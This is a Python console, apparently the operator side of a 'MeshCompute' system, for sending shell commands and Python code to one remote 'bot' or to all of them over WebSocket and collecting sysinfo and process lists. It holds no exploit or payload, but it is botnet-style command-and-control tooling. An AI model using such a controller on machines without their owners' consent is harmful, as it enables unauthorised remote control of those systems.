import asyncio
import websockets
import json
import cmd
import time
from colorama import init, Fore, Style
from dotenv import load_dotenv
from common.config import SERVER_URL, AUTH_TOKEN

load_dotenv()
init(autoreset=True)


class MeshController(cmd.Cmd):
    intro = f"""{Fore.CYAN}
    =====================================
          MeshCompute Controller v2 (Redis)
    =====================================
    Tippe 'help' oder '?' für Befehle.
    ====================================={Style.RESET_ALL}
    """
    prompt = f"\n{Fore.GREEN}meshctrl > {Style.RESET_ALL}"

    def __init__(self):
        super().__init__()
        self.ws = None
        self.connected = False
        self.task_counter = 0

    def next_task_id(self):
        self.task_counter += 1
        return f"{self.task_counter}"

    async def connect(self):
        try:
            self.ws = await websockets.connect(SERVER_URL)
            await self.ws.send(json.dumps({
                "type": "controller",
                "auth_token": AUTH_TOKEN
            }))
            self.connected = True
            print(f"{Fore.GREEN}[+] Erfolgreich mit dem Server verbunden{Style.RESET_ALL}")
            asyncio.create_task(self.receive_messages())
        except Exception as e:
            print(f"{Fore.RED}[-] Verbindung fehlgeschlagen: {e}{Style.RESET_ALL}")
            self.connected = False

    async def receive_messages(self):
        try:
            async for message in self.ws:
                data = json.loads(message)
                if data.get("type") == "result" and "bots" in data.get("data", {}):
                    print(f"\n{Fore.CYAN}=== Verbundene Bots ({data['data']['count']}) ==={Style.RESET_ALL}")
                    for bot in data["data"]["bots"]:
                        status_color = Fore.GREEN if bot["status"] == "online" else Fore.RED
                        print(f"   {status_color}{bot['bot_id']}{Style.RESET_ALL} | "
                              f"{bot['hostname']} | "
                              f"Offline seit: {bot['last_seen_sec']}s")
                elif data.get("type") == "result":
                    bot_id = data.get("bot_id", "Unknown")
                    print(f"\n{Fore.YELLOW}=== Ausgabe von {bot_id} ==={Style.RESET_ALL}")
                    if data.get("info"):
                        info = data["info"]
                        print(f"{Fore.CYAN}System Information:{Style.RESET_ALL}")
                        for key, value in info.items():
                            if key != "bot_id":
                                print(f"   {key:12}: {value}")
                    elif data.get("output"):
                        print(data["output"].strip() or "(keine Ausgabe)")
                    elif data.get("processes"):
                        print(f"{Fore.CYAN}Prozesse:{Style.RESET_ALL}")
                        for p in data["processes"][:20]:
                            print(f"   {p['pid']:6}  {p['name'][:35]:35}  CPU: {p.get('cpu', 0):.1f}%")
                    elif data.get("success") is not None:
                        if data.get("success"):
                            print(f"{Fore.GREEN}Erfolg:{Style.RESET_ALL} {data.get('message', 'OK')}")
                        else:
                            print(f"{Fore.RED}Fehler:{Style.RESET_ALL} {data.get('error', 'Unbekannt')}")
                    else:
                        print(json.dumps(data, indent=2, ensure_ascii=False))
                elif data.get("type") == "error":
                    print(f"{Fore.RED}Fehler: {data.get('message')}{Style.RESET_ALL}")
                elif data.get("type") == "info":
                    print(f"{Fore.BLUE}{data.get('message')}{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}Verbindung zum Server verloren.{Style.RESET_ALL}")
            self.connected = False

    async def send_and_wait(self, command: dict, timeout=30):
        """Sendet Befehl und wartet auf Ergebnis (blockierend)."""
        if not self.connected:
            print(f"{Fore.RED}Nicht verbunden.{Style.RESET_ALL}")
            return
        try:
            await self.ws.send(json.dumps(command))
            # Ergebnis anfordern
            await self.ws.send(json.dumps({
                "type": "get_result",
                "task_id": command["task_id"]
            }))
            # Ergebnis wird in receive_messages verarbeitet (asynchron)
            # Wir müssen kurz warten, bis die Antwort kommt.
            # Einfache Lösung: Der Server sendet das Ergebnis direkt nach get_result.
            # Die receive_messages-Schleife gibt es aus.
        except Exception as e:
            print(f"{Fore.RED}Fehler beim Senden: {e}{Style.RESET_ALL}")

    # === Commands ===
    def do_list(self, arg):
        """Zeigt alle Bots"""
        asyncio.create_task(self.send_and_wait({
            "type": "command",
            "action": "list",
            "task_id": self.next_task_id()
        }))

    def do_exec(self, arg):
        """exec <bot_id|all> <befehl>"""
        if not arg:
            print("Verwendung: exec <bot_id|all> <befehl>")
            return
        parts = arg.split(" ", 1)
        if len(parts) < 2:
            print("Verwendung: exec <bot_id|all> <befehl>")
            return
        target, cmd_text = parts
        task_id = self.next_task_id()
        asyncio.create_task(self.send_and_wait({
            "type": "command",
            "action": "exec",
            "target": target,
            "payload": cmd_text,
            "task_id": task_id
        }, timeout=60))  # exec kann länger dauern
        print(f"{Fore.BLUE}[→] Befehl gesendet (Task {task_id}){Style.RESET_ALL}")

    def do_sysinfo(self, arg):
        """sysinfo <bot_id|all>"""
        target = arg.strip() or "all"
        asyncio.create_task(self.send_and_wait({
            "type": "command",
            "action": "sysinfo",
            "target": target,
            "task_id": self.next_task_id()
        }))

    def do_python(self, arg):
        """python <bot_id|all> <code>"""
        if not arg:
            print("Verwendung: python <bot_id|all> print('Hallo')")
            return
        parts = arg.split(" ", 1)
        target = parts[0]
        code = parts[1] if len(parts) > 1 else ""
        asyncio.create_task(self.send_and_wait({
            "type": "command",
            "action": "python",
            "target": target,
            "payload": code,
            "task_id": self.next_task_id()
        }))

    def do_ps(self, arg):
        """ps <bot_id|all>"""
        target = arg.strip() or "all"
        asyncio.create_task(self.send_and_wait({
            "type": "command",
            "action": "ps",
            "target": target,
            "task_id": self.next_task_id()
        }))

    def do_ping(self, arg):
        """ping <bot_id|all>"""
        target = arg.strip() or "all"
        asyncio.create_task(self.send_and_wait({
            "type": "command",
            "action": "ping",
            "target": target,
            "task_id": self.next_task_id()
        }))

    def do_exit(self, arg):
        """Beenden"""
        print(f"{Fore.YELLOW}Controller wird beendet...{Style.RESET_ALL}")
        if self.ws:
            asyncio.create_task(self.ws.close())
        return True

    def do_clear(self, arg):
        """Bildschirm leeren"""
        print("\033c", end="")
    do_cls = do_clear

async def main():
    controller = MeshController()
    await controller.connect()
    while True:
        try:
            if controller.connected:
                cmd_input = await asyncio.get_event_loop().run_in_executor(None, input, controller.prompt)
                if cmd_input.strip():
                    controller.onecmd(cmd_input)
            else:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Beendet.{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"Fehler: {e}")

if __name__ == "__main__":
    print(f"{Fore.MAGENTA}MeshCompute Controller wird gestartet...{Style.RESET_ALL}")
    asyncio.run(main())